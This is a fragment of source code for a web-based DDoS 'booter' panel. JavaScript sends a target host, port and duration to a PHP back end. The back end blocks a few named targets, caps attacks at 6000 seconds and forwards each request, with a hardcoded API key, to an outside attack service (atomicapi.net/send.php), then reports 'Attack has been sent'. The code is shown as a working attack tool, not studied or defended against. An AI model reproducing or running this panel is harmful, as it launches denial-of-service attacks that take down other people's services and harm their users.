...
function hub()
	...
	xmlhttp.onreadystatechange=function()
	  ...
	  if (xmlhttp.readyState==4 && xmlhttp.status==200)
	    {
	    document.getElementById("sent").innerHTML = "Request has been sent...";
	    }
	  }
	xmlhttp.open("GET","hub.php?host="+document.getElementById('host').value+"&time="+document.getElementById('time').value+"&dosattack=2&port="+document.getElementById('port'));
	xmlhttp.send();
}
</script>
 <script>
...
if(n==0){
document.getElementById('btn').value='Hit';
...
if($time >= 6000) {
die("<hr>You cannot issue attacks exceeding 6000 seconds.");
}
...
if($host == "google.com") { die("<hr><font color=lime><center>You cannot attack this.</center></font color>"); }
if($host == "facebook.com") { die("<hr><font color=lime><center>You cannot attack this.</center></font color>"); }
if($host == "fbi.gov" || $host == "cia.gov" || $host == "nasa.gov") { die("<hr><font color=lime><center>You cannot attack this.</center></font>"); }
...
*/
	...
	// http://atomicapi.net/send.php?host=1.2.3.4&port=80&time=120&key=123
	// key: 4051140
	$h = $host;
	$p = $port;
	$t = $time;
	if($h == "atomicapi.net") { die("<hr><font color=lime><center>You cannot attack this.</center></font color>"); }
	$d = date("m-d-Y, h:i:s a", time());
	file_get_contents("http://atomicapi.net/send.php?host=".$h."&port=".$p."&time=".$t."&key=4051140");
echo "<p id='sent'><center><strong><font color=\"lime\">Attack has been sent on ".$d."!</font></strong></center></p>";
